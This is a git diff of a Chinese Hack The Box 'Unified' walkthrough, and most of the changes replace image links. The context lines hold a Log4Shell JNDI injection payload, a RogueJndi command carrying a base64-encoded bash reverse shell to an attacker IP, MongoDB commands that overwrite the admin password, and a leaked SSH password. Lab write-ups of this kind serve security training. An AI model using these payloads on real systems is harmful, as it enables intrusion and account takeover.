@@ -11,32 +11,32 @@ tags:
 ---
 
 ## TASK 1
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709385741617-1ff74927-b9c7-422c-a357-ecae7a3c9004.png)
+![](/image/hackthebox/Unified-1.png)
 
 利用nmap扫描即可
 
 ## TASK 2
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709386000972-28163e26-2b81-44a3-937e-73f4a29264f9.png)
+![](/image/hackthebox/Unified-2.png)
 
 查看8080网站标题即可
 
 ## TASK 3
 ![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709386103549-2ef74660-c40f-4d7e-aba2-533a4aac94ef.png)
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709386024581-32dc23e3-b8eb-4a08-8faf-61e4a5f3fc85.png)
+![](/image/hackthebox/Unified-4.png)
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709386078782-cc845894-1e94-4da1-9273-110267a0e6f0.png)仔细观察登录窗口即可
+![](/image/hackthebox/Unified-5.png)仔细观察登录窗口即可
 
 ## TASK 4
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709386260785-28b1949a-b2c2-4367-9dc9-78dd9d060aad.png)
+![](/image/hackthebox/Unified-6.png)
 
 <font style="color:rgb(77, 77, 77);">这时候就要想到了既然给了一个cms框架，也知道具体版本，那么就可以去搜索一下这个版本的unifi有没有什么cve</font>  
 <font style="color:rgb(77, 77, 77);">果然，通过Google得知unifi 6.4.54存在漏洞CVE-2021-44228，是一个log4j漏洞</font>
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709386329869-692bbafd-46c7-40af-a240-f1ad86076118.png)
+![](/image/hackthebox/Unified-7.png)
 
 ## TASK 5
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709386519061-82319868-c135-4f14-bb76-f349b8c7bae6.png)
+![](/image/hackthebox/Unified-8.png)
 
 ### 漏洞利用
 [https://cloud.tencent.com/developer/article/1922132](https://cloud.tencent.com/developer/article/1922132)
@@ -50,9 +50,9 @@ tags:
 
 <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">编辑登录数据包，在data的remember字段中把flase改成"${jndi:ldap://10.10.16.20/whatever}"，重新发送数据包</font>
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709439301798-4ad30ff8-5020-431d-b24d-8d5790d740a7.png)
+![](/image/hackthebox/Unified-9.png)
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709439273904-86b49ff6-e886-4705-8e6b-bbdda44da8d6.png)
+![](/image/hackthebox/Unified-10.png)
 
 成功接收到数据
 
@@ -76,7 +76,7 @@ maven需要换国内源
 
 查教程搞了半天才搞好
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709462474140-50f0064d-9578-427a-9b8d-35dcfdbe704e.png)
+![](/image/hackthebox/Unified-11.png)
 
 ![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709462733737-3edad190-f734-496f-8451-8e0bdbc5830d.png)
 
@@ -132,7 +132,7 @@ ctx.lookup("ldap://your-server/cn=bar,dc=test,dc=org");//实际上传进来的
 
 首先log4j打印日志有四个级别：debug、info、warn、error，不管哪个方法打印日志，在正常的log处理过程中，对KaTeX parse error: Expected '}', got 'EOF' at end of input: …。 一旦在log字符串中检测到{}，就会解析其中的字符串尝试使用lookup查询，因此只要能控制log参数内容，就有机会实现漏洞利用。
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709471523458-742a480c-54e2-48ec-813c-163adf02604c.png)
+![](/image/hackthebox/Unified-13.png)
 
 修复思路
 
@@ -157,7 +157,7 @@ ctx.lookup("ldap://your-server/cn=bar,dc=test,dc=org");//实际上传进来的
 综上所述我们可以知道**<font style="color:rgb(255, 255, 255);background-color:rgb(20, 29, 43);">JNDI 在注入中利用 LDAP协议</font>**
 
 ## TASK 6
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709471636365-53939548-dbbd-4920-9c50-feb697fd2632.png)
+![](/image/hackthebox/Unified-14.png)
 
 <font style="color:rgb(77, 77, 77);">Tcpdump</font>
 
@@ -173,12 +173,12 @@ ctx.lookup("ldap://your-server/cn=bar,dc=test,dc=org");//实际上传进来的
 >
 
 ## TASK 7
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709471842526-b55bf93f-8c9b-4619-af98-75d4011c2744.png)
+![](/image/hackthebox/Unified-15.png)
 
 389端口
 
 ## TASK 8
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709471882650-2a8eb411-4c89-47ac-b36a-eb4878c52839.png)
+![](/image/hackthebox/Unified-16.png)
 
 看到这道题基本清楚要开始漏洞复现了
 
@@ -195,7 +195,7 @@ ctx.lookup("ldap://your-server/cn=bar,dc=test,dc=org");//实际上传进来的
 
 <font style="color:rgb(35, 38, 59);">接下来使用RogueJndi-1.1.jar并监听4444端口</font>
 
-> java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<font style="color:rgb(77, 77, 77);">YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQzIDA+JjEK</font>}|{base64,-d}|{bash,-i}" --hostname "10.10.16.20"![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709472646304-23e35140-0110-4834-984c-86fb02d9b86e.png)
+> java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<font style="color:rgb(77, 77, 77);">YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjAvNDQzIDA+JjEK</font>}|{base64,-d}|{bash,-i}" --hostname "10.10.16.20"![](/image/hackthebox/Unified-17.png)
 >
 
 利用tomcat传参
@@ -232,7 +232,7 @@ ldap://10.10.16.20:1389/o=tomcat
 
 <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">"${jndi:ldap://10.10.16.20:1389/o=tomcat}"</font>
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709475678356-34718533-13a7-4673-a73c-630af2660111.png)
+![](/image/hackthebox/Unified-18.png)
 
 由于不是交互式shell看着难受咱们可以改一下
 
@@ -247,7 +247,7 @@ ldap://10.10.16.20:1389/o=tomcat
 
 **<font style="color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);"></font>**
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709475879992-64a3cff5-3f90-4e4a-beb3-082ba83b40f8.png)
+![](/image/hackthebox/Unified-19.png)
 
 由于看的界面非常小，所以我们将这个输出到文档里，之后cat进行查看
 
@@ -255,35 +255,35 @@ ps aux > process_list.txt
 
 cat process_list.txt
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709476161834-8326b9e0-51d4-46d7-9469-889625eef75f.png)
+![](/image/hackthebox/Unified-20.png)
 
 可以看见端口在27117开放
 
 ## TASK 9
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709476459096-ce64d696-c896-4c70-b41a-7e18499cf34a.png)
+![](/image/hackthebox/Unified-21.png)
 
 mongodb --port 2717
 
 <font style="color:rgb(35, 38, 59);">直接本地进行连接数据库</font>
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709476485301-b578376c-f9b3-4303-9188-88955f13dd17.png)show dbs一下
+![](/image/hackthebox/Unified-22.png)show dbs一下
 
 发现默认数据库名字为ace
 
 ## TASK 10
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709476515929-3bf93e9a-e12c-4d72-9316-d887864d6275.png)
+![](/image/hackthebox/Unified-23.png)
 
 <font style="color:rgb(77, 77, 77);">db.admin.find()</font>
 
 ## <font style="color:rgb(77, 77, 77);">TASK 11</font>
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709476573430-c2859a32-0ad0-44f6-a69c-06716c738329.png)
+![](/image/hackthebox/Unified-24.png)
 
 <font style="color:rgb(68, 68, 68);">db.admin.update()</font>
 
 ## <font style="color:rgb(68, 68, 68);">TASK 12</font>
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709476640662-16b903a9-fce5-410f-83df-5f59f74b4c30.png)
+![](/image/hackthebox/Unified-25.png)
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709476851827-a4ae1a91-cb35-4735-aeed-43e28079c2b2.png)
+![](/image/hackthebox/Unified-26.png)
 
 发现admin的账号以及密码
 
@@ -312,13 +312,13 @@ mongodb --port 2717
 
 <font style="color:rgb(35, 38, 59);"></font>
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709476947049-bcdc95e4-60f0-46c3-820f-7c8edb50ef6d.png)
+![](/image/hackthebox/Unified-27.png)
 
 <font style="color:rgb(35, 38, 59);">执行成功后寻找刚刚添加的用户</font>
 
 <font style="color:rgb(35, 38, 59);">db.admin.find().forEach(printjson);</font>
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709477197864-642462f8-4b80-42c8-9cbe-92136785da06.png)
+![](/image/hackthebox/Unified-28.png)
 
 id 65e48cdb4a29d756feab4d2a
 
@@ -350,11 +350,11 @@ id 65e48cdb4a29d756feab4d2a
 
 <font style="color:rgb(35, 38, 59);">再使用修改后的密码登录网站，登录成功</font>
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709477589112-46bfd575-bda9-4769-8b5c-4973ad67e435.png)
+![](/image/hackthebox/Unified-29.png)
 
 <font style="color:rgb(35, 38, 59);">后台设置里看到ssh密码</font>
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709477596604-2a74eeef-31a9-47b7-9843-7721852170f7.png)
+![](/image/hackthebox/Unified-30.png)
 
 <font style="color:rgb(68, 68, 68);">NotACrackablePassword4U2022</font>
 
